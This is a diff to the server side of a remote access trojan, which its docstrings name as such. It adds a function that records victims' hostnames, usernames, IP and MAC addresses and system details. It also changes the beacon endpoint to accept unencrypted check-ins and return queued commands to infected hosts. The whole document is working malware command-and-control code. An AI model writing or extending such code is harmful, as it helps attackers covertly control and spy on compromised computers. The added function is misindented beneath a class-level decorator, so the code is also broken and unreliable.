@@ -152,7 +152,98 @@ def generate_key():
 
 class SessionManager:
     """Manage active RAT sessions"""
-    
+    @staticmethod
+def register_plain_session(session_id, info):
+    """Register a session using plain info (no decryption needed)."""
+    try:
+        conn = sqlite3.connect(DATABASE)
+        cursor = conn.cursor()
+        now = datetime.datetime.now()
+
+        # Check if session exists
+        cursor.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,))
+        existing = cursor.fetchone()
+
+        if existing:
+            # Update existing session
+            cursor.execute('''
+                UPDATE sessions SET 
+                    last_seen = ?,
+                    status = ?,
+                    ip_address = ?,
+                    public_ip = ?
+                WHERE session_id = ?
+            ''', (now, "active", 
+                  info.get("ip_addresses", [""])[0] if info.get("ip_addresses") else "",
+                  info.get("public_ip", ""),
+                  session_id))
+        else:
+            # Insert new session
+            cursor.execute('''
+                INSERT INTO sessions 
+                (id, session_id, hostname, username, platform, system, 
+                 ip_address, public_ip, mac_address, first_seen, last_seen, status)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                str(uuid.uuid4()),
+                session_id,
+                info.get("hostname", "Unknown"),
+                info.get("username", "Unknown"),
+                info.get("platform", "Unknown"),
+                info.get("system", "Unknown"),
+                info.get("ip_addresses", [""])[0] if info.get("ip_addresses") else "",
+                info.get("public_ip", "Unknown"),
+                info.get("mac_address", "Unknown"),
+                now,
+                now,
+                "active"
+            ))
+
+            # Also insert system info if present
+            cursor.execute('''
+                INSERT INTO system_info
+                (id, session_id, cpu_count, memory_total, disk_usage, 
+                 processes, boot_time, timezone, timestamp)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                str(uuid.uuid4()),
+                session_id,
+                info.get("cpu_count", 0),
+                info.get("memory_total", 0),
+                json.dumps(info.get("disk_usage", {})),
+                info.get("processes", 0),
+                info.get("boot_time", 0),
+                json.dumps(info.get("timezone", [])),
+                now
+            ))
+
+        conn.commit()
+        conn.close()
+
+        # Update in‑memory session cache
+        SESSIONS[session_id] = {
+            "info": info,
+            "last_seen": now,
+            "status": "active",
+            "commands": []
+        }
+
+        # Emit WebSocket event
+        socketio.emit('session_update', {
+            'session_id': session_id,
+            'hostname': info.get("hostname"),
+            'username': info.get("username"),
+            'ip': info.get("public_ip"),
+            'status': 'active',
+            'last_seen': now.isoformat()
+        })
+
+        LOGGER.info(f"Session registered (plain): {session_id} from {info.get('public_ip')}")
+        return {"status": "success", "session_id": session_id}
+
+    except Exception as e:
+        LOGGER.error(f"Plain session registration error: {e}")
+        return {"status": "error", "message": str(e)}
     @staticmethod
     def register_session(session_data):
         """Register a new session or update existing"""
@@ -316,35 +407,50 @@ def encrypt_data(data):
 
 @app.route('/api/beacon', methods=['POST'])
 def beacon():
-    """Handle RAT beacon"""
+    """Handle RAT beacon – supports both encrypted and plain data."""
     try:
         data = request.get_json()
         session_id = data.get("session_id")
+        session_data = data.get("data")  # base64 string (may be encrypted or plain)
         
-        # Register/update session
-        session_data = data.get("data")
+        # Process the beacon data if present
         if session_data:
-            result = SessionManager.register_session(data)
-            if result["status"] != "success":
-                return jsonify({"status": "error"}), 500
-        
-        # Get pending commands for session
+            info = None
+            # First, try to decrypt it as if it were encrypted (original behaviour)
+            try:
+                decrypted = decrypt_data(session_data)
+                info = json.loads(decrypted)
+                LOGGER.info(f"Decrypted beacon from {session_id}")
+            except Exception:
+                # If decryption fails, try to decode as plain base64 JSON
+                try:
+                    plain_json = base64.b64decode(session_data).decode('utf-8')
+                    info = json.loads(plain_json)
+                    LOGGER.info(f"Accepted plain beacon from {session_id}")
+                except Exception as e2:
+                    LOGGER.error(f"Could not parse beacon data: {e2}")
+                    return jsonify({"status": "error", "message": "Invalid data format"}), 400
+
+            # Register or update the session using the obtained info
+            if info:
+                # Use a helper method that accepts plain info
+                result = SessionManager.register_plain_session(session_id, info)
+                if result["status"] != "success":
+                    return jsonify({"status": "error"}), 500
+
+        # Get pending commands for this session
         commands = []
         if session_id in COMMAND_QUEUE:
             commands = COMMAND_QUEUE.get(session_id, [])
-            COMMAND_QUEUE[session_id] = []
-        
-        # Update last seen
+            COMMAND_QUEUE[session_id] = []  # clear after retrieval
+
+        # Update last seen timestamp
         if session_id in SESSIONS:
             SESSIONS[session_id]["last_seen"] = datetime.datetime.now()
-        
+
         LOGGER.debug(f"Beacon from {session_id}, {len(commands)} commands pending")
-        
-        return jsonify({
-            "status": "success",
-            "commands": commands
-        })
-        
+        return jsonify({"status": "success", "commands": commands})
+
     except Exception as e:
         LOGGER.error(f"Beacon error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
